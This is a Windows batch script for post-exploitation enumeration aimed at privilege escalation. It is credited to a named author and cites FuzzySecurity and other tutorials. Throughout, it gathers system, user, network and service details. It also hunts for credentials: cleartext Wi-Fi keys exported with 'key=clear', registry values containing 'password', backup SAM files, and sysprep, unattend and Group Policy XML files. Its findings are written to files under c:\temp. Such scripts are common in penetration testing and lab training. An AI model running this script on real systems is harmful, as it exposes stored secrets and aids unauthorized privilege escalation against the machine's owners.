REM Windows Enumeration Batch Script v20160910
REM @matt0177
REM HUGE thanks to @FuzzySec and @GradiusX
REM For information on Windows privlidge escalation, be sure to read  https://www.fuzzysecurity.com/tutorials/16.html


@echo off
echo ##################Hostname > output.txt
hostname >> output.txt
echo. >> output.txt

echo ##################whoami >> output.txt
whoami >> output.txt
echo. >> output.txt

echo ##################echo %%USERNAME%% >> output.txt
echo %USERNAME% >> output.txt
echo. >> output.txt

echo ##################net users >> output.txt
net users >> output.txt
echo. >> output.txt

echo ##################net user %%USERNAME%% >> output.txt
net user %USERNAME% >> output.txt
echo. >> output.txt

echo ################## systeminfo >> output.txt
systeminfo >> output.txt
echo. >> output.txt

echo ################## fsutil fsinfo drives >> output.txt
echo ################## (shows mounted drives) >> output.txt
fsutil fsinfo drives >> output.txt
echo. >> output.txt

echo ################## path >> output.txt
echo %PATH% >> output.txt
echo. >> output.txt

echo ################## tasklist /SVC >> output.txt
tasklist /SVC >> output.txt
echo. >> output.txt

echo ################## Checking if .msi files are always installed with elevated privlidges>> output.txt
echo ################## NOTE: Both values below must be 1 >> output.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> output.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated /v AlwaysInstallElevated >> output.txt
echo. >> output.txt

echo #### Checking for backup SAM files >> output.txt

echo #### dir %SYSTEMROOT%\repair\SAM >> output.txt
dir %%SYSTEMROOT%%\repair\SAM >> output.txt

echo #### dir %SYSTEMROOT%\system32\config\regback\SAM >> output.txt
dir %%SYSTEMROOT%%\system32\config\regback\SAM >> output.txt
echo. >> output.txt

echo #### Checking for vulnerable services that can be modified by unprivlidged users >> output.txt
echo #### USES AccessChk from sysinternals >> output.txt
echo #### Reference: http://toshellandback.com/2015/11/24/ms-priv-esc/   and http://www.fuzzysecurity.com/tutorials/16.html>> output.txt
accesschk.exe -uwcqv "Authenticated Users" * /accepteula >> output.txt
accesschk.exe -uwcqv "Users" * /accepteula >> output.txt
accesschk.exe -uwcqv "Everyone" * /accepteula >> output.txt
echo. >> output.txt

echo ##################################################### >> output.txt
echo ################## Checking for possible creds >> output.txt
echo ##################################################### >> output.txt

echo ################## type c:\sysprep.inf >> output.txt
type c:\sysprep.inf >> output.txt
echo. >> output.txt

echo ################## type c:\sysprep\sysprep.xml>> output.txt
type c:\sysprep\sysprep.xml >> output.txt
echo. >> output.txt

echo ##################################################### >> output.txt
echo ################## Network Information >> output.txt
echo ##################################################### >> output.txt

echo ################## ipconfig /all >> output.txt
ipconfig /all >> output.txt
echo. >> output.txt

echo ################## net use (view current connetions) >> output.txt
net use >> output.txt
echo. >> output.txt

echo ################## net share (view shares) >> output.txt
net share >> output.txt
echo. >> output.txt

echo ################## arp -a >> output.txt
arp -a >> output.txt
echo. >> output.txt

echo ################## route print>> output.txt
route print >> output.txt
echo. >> output.txt

echo ################## netstat -nao >> output.txt
netstat -nao >> output.txt
echo. >> output.txt

echo ################## netsh firewall show state >> output.txt
netsh firewall show state >> output.txt
echo. >> output.txt

echo ################## netsh firewall show config >> output.txt
netsh firewall show config >> output.txt
echo. >> output.txt

echo ################## netsh wlan export profile key=clear >> output.txt
echo ################## Shows wireless network information>> output.txt
netsh wlan export profile key=clear
type wi-fi*.xml >> output.txt
del wi-fi*.xml
echo. >> output.txt

echo ##################################################### >> output.txt
echo ################## Scheduled Tasks >> output.txt
echo ##################################################### >> output.txt

echo ################## schtasks /query /fo LIST /v >> output.txt
schtasks /query /fo LIST /v >> output.txt
echo. >> output.txt

echo ################## net start >> output.txt
net start >> output.txt
echo. >> output.txt

echo ################## DRIVERQUERY >> output.txt
DRIVERQUERY >> output.txt
echo. >> output.txt

echo ##################################################### >> output.txt
echo ################## Any mentions of "password" in the registry >> output.txt
echo ##################################################### >> output.txt

reg query HKLM /f password  /t REG_SZ  /s >> output.txt

echo. >> output.txt

echo ##################################################### >> output.txt
echo ################## Switching to the c:\ directory and making a c:\temp directory for dir scans >> output.txt
echo ##################################################### >> output.txt
echo Switching to C:\ !!!!!!!!!!!
echo Remember to grab all files
mkdir c:\temp
copy output.txt c:\temp\output.txt
cd\


echo ################## Checking for files with pass, cred, vnc or .config in the name > c:\temp\dir_output.txt

echo ################## dir /s *pass* #######################################################  >> c:\temp\dir_output.txt
dir /s *pass*  >>c:\temp\dir_output.txt

echo ################## dir /s *cred* #######################################################  >> c:\temp\dir_output.txt
dir /s *cred*  >>c:\temp\dir_output.txt

echo ################## dir /s *vnc*  ####################################################### >> c:\temp\dir_output.txt
dir /s *vnc*  >>c:\temp\dir_output.txt

echo ################## dir /s *.config #####################################################  >> c:\temp\dir_output.txt
dir /s *.config  >>c:\temp\dir_output.txt

echo. >> c:\temp\dir_output.txt

echo ################## Checking for files with possible creds >> c:\temp\dir_output.txt
echo ################## Reference: http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html >> c:\temp\dir_output.txt

echo ################## dir /s groups.xml  >> c:\temp\dir_output.txt
dir /s groups.xml  >>c:\temp\dir_output.txt

echo ################## dir /s ScheduledTasks.xml   >> c:\temp\dir_output.txt
dir /s ScheduledTasks.xml  >>c:\temp\dir_output.txt

echo ################## dir /s printers.xml   >> c:\temp\dir_output.txt
dir /s printers.xml  >>c:\temp\dir_output.txt

echo ################## dir /s drives.xml   >> c:\temp\dir_output.txt
dir /s drives.xml  >>c:\temp\dir_output.txt

echo ################## dir /s DataSources.xml  >> c:\temp\dir_output.txt
dir /s DataSources.xml  >>c:\temp\dir_output.txt

echo ################## dir /s web.config  >> c:\temp\dir_output.txt
dir /s web.config  >>c:\temp\dir_output.txt

echo. >> c:\temp\dir_output.txt

echo ################## Checking for unattended install files >> c:\temp\dir_output.txt

echo ################## dir /s unattended.xml  >> c:\temp\dir_output.txt
dir /s unattended.xml  >>c:\temp\dir_output.txt

echo ################## dir /s unattend.xml  >> c:\temp\dir_output.txt
dir /s unattend.xml  >>c:\temp\dir_output.txt

echo ################## dir /s unattend.txt  >> c:\temp\dir_output.txt
dir /s unattend.txt >>c:\temp\dir_output.txt

echo ################## dir /s autounattend.xml  >> c:\temp\dir_output.txt
dir /s autounattend.xml >>c:\temp\dir_output.txt

echo ################## dir /s sysprep.inf  >> c:\temp\dir_output.txt
dir /s sysprep.inf >>c:\temp\dir_output.txt

echo ################## dir /s sysprep.xml  >> c:\temp\dir_output.txt
dir /s sysprep.xml >>c:\temp\dir_output.txt

echo ################## Creating a tree of the c:\ drive >> c:\temp\dir_output.txt
echo ################## Ouput to "output_of_tree.txt file" >> c:\temp\dir_output.txt

tree C:\ /f /a > c:\temp\output_of_tree.txt

echo ##################################################### 
echo ################## Checks which don't output to a file!!!!
echo ##################################################### 

echo ################## Checking for services which arn't properly quoted
echo ################## Reference http://toshellandback.com/2015/11/24/ms-priv-esc/
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ 



